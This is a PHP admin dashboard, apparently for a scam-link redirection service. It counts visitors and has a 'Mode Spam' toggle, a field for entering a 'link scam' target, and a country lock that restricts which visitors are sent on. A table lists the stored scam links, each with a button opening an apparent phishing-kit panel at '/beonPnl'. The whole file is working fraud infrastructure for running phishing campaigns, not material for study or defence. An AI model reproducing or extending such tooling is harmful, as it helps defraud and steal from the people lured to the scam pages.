<?php
$get_country = json_decode(file_get_contents("../core/country.json"), true);
$get_codeCountry = json_decode(file_get_contents("../core/code_country.json"), true);

include('template/header.php');

?>
<div class="container">
    <!-- Page Sidebar Ends-->
    <div class="page-body">
        <!-- Container-fluid starts-->
        <div class="container-fluid">
            <div class="row starter-main">
                <div class="col-sm-6 mb-2">
                    <div class="card-visit">
                        <div class="img-sagiri-home">
                            <img class="img-los" src="https://linkpirbadi.b-cdn.net/assets/img/bingung.png"
                                alt="sagiri">
                        </div>
                        <div class="blam">
                            <div class="text-center">
                                <h4>Visitor</h4>
                            </div>
                            <div class="text-center">
                                <h2><?php
                                    $visitor = getVisitor();
                                    echo count($visitor);
                                    ?></h2>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-sm-6 mb-2">
                    <div class="card-visit">
                        <div class="img-sagiri-side">
                            <img class="img-losa" src="https://linkpirbadi.b-cdn.net/assets/img/bikini.png"
                                alt="sagiri">
                        </div>
                        <div class="blam">
                            <div class="text-center">
                                <h4>Visitor <?= getCountryLock()[0]['country']; ?></h4>
                            </div>
                            <div class="text-center">
                                <h2>
                                    <?php
                                    $visitor = getVisitor();
                                    $count = 0;
                                    foreach ($visitor as $key => $value) {
                                        if ($value['code_country'] == getCountryLock()[0]['country']) {
                                            $count++;
                                        }
                                    }
                                    echo $count;
                                    ?>
                                </h2>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-sm-12 mb-2">
                    <div class="card-settings">
                        <div class="img-sagiri-side">
                            <img class="img-losa" src="https://linkpirbadi.b-cdn.net/assets/img/sekolah.png"
                                alt="sagiri">
                        </div>
                        <form>
                            <div class="mb-2">
                                <h5 style="text-transform: uppercase;">Mode Spam</h5>
                                <?php
                                $modes = getMode()[0];
                                if ($modes['mode'] == 'true') {
                                    $status = 'checked';
                                } else {
                                    $status = '';
                                }
                                if ($modes['mode'] == 'true') {
                                    $update = 'disabled';
                                } else {
                                    $update = '';
                                }
                                ?>
                                <input id="mode" type="checkbox" <?= $status ?> data-toggle="toggle"
                                    data-onstyle="light">
                            </div>
                            <h5 style="text-transform: uppercase;">Link SEttings</h5>
                            <div class="mb-2 row">
                                <div class="col-lg-12">
                                    <div class="input-group">
                                        <input name="link" class="form-control btn-square" placeholder="link scam"
                                            type="text">

                                        <button <?= $update ?> type="button" id="linkscam"
                                            class="input-group-text btn btn-secondary btn-right"><i
                                                class="icon-plus"></i> Update
                                        </button>
                                    </div>
                                </div>
                            </div>
                            <div class="mb-2 row">
                                <div class="col-lg-12">
                                    <div class="input-group">
                                        <select id="lock_country" class="form-control btn-square">
                                            <option>LOCK COUNTRY</option>

                                            <?php
                                            foreach ($get_country as $key => $value) {
                                                echo '<option value="' . $value['code'] . '">' . $value['name'] . '</option>';
                                            }
                                            ?>

                                        </select>

                                        <button <?= $update ?> type="button" id="countrylock"
                                            class="input-group-text btn btn-secondary btn-right"><i
                                                class="icon-plus"></i> Update
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </form>
                    </div>

                </div>
                <div class="col-sm-12">
                    <div class="card-status">
                        <div class="img-sagiri-side">
                            <img class="img-losa" src="https://linkpirbadi.b-cdn.net/assets/img/hot.png" alt="sagiri">
                        </div>
                        <div class="status-blam">
                            <h5 style="text-transform: uppercase;">Status</h5>
                            <table class="table table-bordered table-fixed-header">
                                <thead>
                                    <tr>
                                        <th>Country Lock</th>
                                        <th>Code</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr>
                                        <?php

                                        $country_lock = getCountryLock()[0];
                                        $country_mix = $get_codeCountry[$country_lock['country']];

                                        ?>
                                        <td><?= $country_mix ?></td>
                                        <td><?= $country_lock['country']; ?></td>
                                    </tr>

                                </tbody>
                            </table>

                            <table id="datatable" class="table  table-hover table-fixed-header">
                                <thead>
                                    <tr>
                                        <th>Link Scam</th>
                                        <th>Action</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php
                                    $scama = getScama();

                                    foreach ($scama as $value) {
                                        $linksc = $value['link_sc'];
                                        $idlinksc = $value['idlink_scama'];
                                        $panel = explode('/', $linksc)[2];
                                        $panel = "https://$panel/beonPnl";
                                    ?>
                                    <tr>
                                        <td><?= $linksc  ?></td>
                                        <td>
                                            <button id="<?= $idlinksc ?>" class="btn btn-danger btn-sm trash"><i
                                                    class="icon-trash"></i>
                                                Delete</button> |

                                            <a href="<?= $panel ?>" target="_blank" class="btn btn-warning btn-sm"><i
                                                    class="icon-user"></i>
                                                Panel</a>

                                        </td>
                                    </tr>
                                    <?php
                                    }
                                    ?>
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!-- Container-fluid Ends-->
    </div>
</div>
<?php

include('template/footer.php');

?>